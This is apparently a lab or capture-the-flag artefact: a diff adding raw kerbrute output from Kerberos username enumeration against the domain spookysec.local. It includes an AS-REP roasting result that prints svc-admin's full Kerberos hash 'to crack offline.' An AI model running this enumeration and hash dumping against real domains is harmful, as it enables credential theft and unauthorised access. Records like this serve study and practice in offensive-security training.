@@ -1,0 +1,25 @@
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: dev (n/a) - 08/20/21 - Ronnie Flathers @ropnop
+
+2021/08/20 13:49:05 >  Using KDC(s):[0m
+2021/08/20 13:49:05 >      10.10.252.205:88
+[0m
+[32m2021/08/20 13:49:06 >  [+] VALID USERNAME:     [REDACTED]@spookysec.local[0m
+[32m2021/08/20 13:49:08 >  [+] svc-admin has no pre auth required. Dumping hash to crack offline:
+$krb5asr[REDACTED]@spookysec.local:f40d755628cae716456e2eecf1426de0$ce6dd9a6f49a4f7dd58a6a55cf149b2910b074cd88de640ac2de20347dd7d2dea71f30eb8f0a3cb1b6cf4b3ecfaa6975485eb2b2a801abe99b7120b12c99b5c10bcbfcd76f387438a7b568dffbcbc44b0e339aecf31a6f7550bc2c42c799ce2f715bf49f3742c16ae686fa8cf7064f2ae67bcedb10b21897e1a1fc8a4fa85967ced617a17676735e7f275a6f866d5170d3c11059efaf310b1817f028355d83b0acfbac4a843e9548334bf17d550c98bb510518de1a48d97ddc035630a584d6d10de2a88c245fc7d63d266ca25c8ca1aca0ce5f3ad10ee03f28eda438bc911e49a96748c72be2e13422fe24fa1493a41fda4b97ef175d0966fd13e1b572[0m
+[32m2021/08/20 13:49:08 >  [+] VALID USERNAME:     [REDACTED]@spookysec.local[0m
+[32m2021/08/20 13:49:12 >  [+] VALID USERNAME:     [REDACTED]@spookysec.local[0m
+[32m2021/08/20 13:49:13 >  [+] VALID USERNAME:     [REDACTED]@spookysec.local[0m
+[32m2021/08/20 13:49:25 >  [+] VALID USERNAME:     [REDACTED]@spookysec.local[0m
+[32m2021/08/20 13:49:32 >  [+] VALID USERNAME:     [REDACTED]@spookysec.local[0m
+[32m2021/08/20 13:49:47 >  [+] VALID USERNAME:     [REDACTED]@spookysec.local[0m
+[32m2021/08/20 13:49:54 >  [+] VALID USERNAME:     [REDACTED]@spookysec.local[0m
+[32m2021/08/20 13:50:40 >  [+] VALID USERNAME:     [REDACTED]@spookysec.local[0m
+[32m2021/08/20 13:50:55 >  [+] VALID USERNAME:     [REDACTED]@spookysec.local[0m
+[32m2021/08/20 13:52:26 >  [+] VALID USERNAME:     [REDACTED]@spookysec.local[0m
